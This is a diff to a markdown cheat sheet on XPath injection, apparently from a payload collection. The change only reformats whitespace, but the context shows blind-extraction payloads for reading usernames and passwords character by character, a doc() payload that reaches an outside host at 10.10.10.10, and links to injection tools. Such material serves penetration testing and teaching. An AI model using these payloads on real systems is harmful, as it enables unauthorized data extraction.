@@ -36,10 +36,13 @@ search=Har') and starts-with(../password,'c
 ## Blind Exploitation
 
 1. Size of a string
+
     ```sql
     and string-length(account)=SIZE_INT
     ```
+
 2. Extract a character
+
     ```sql
     substring(//user[userid=5]/username,2,1)=CHAR_HERE
     substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)
@@ -54,8 +57,8 @@ http://example.com/?title=Foundation&type=*&rent_days=* and doc('//10.10.10.10/S
 ## Tools
 
 - [xcat](https://github.com/orf/xcat) - Automate XPath injection attacks to retrieve documents
-- [xxxpwn](https://github.com/feakk/xxxpwn) - Advanced XPath Injection Tool 
-- [xxxpwn_smart](https://github.com/aayla-secura/xxxpwn_smart) - A fork of xxxpwn using predictive text 
+- [xxxpwn](https://github.com/feakk/xxxpwn) - Advanced XPath Injection Tool
+- [xxxpwn_smart](https://github.com/aayla-secura/xxxpwn_smart) - A fork of xxxpwn using predictive text
 - [xpath-blind-explorer](https://github.com/micsoftvn/xpath-blind-explorer)
 - [XmlChor](https://github.com/Harshal35/XMLCHOR) - Xpath injection exploitation tool
 
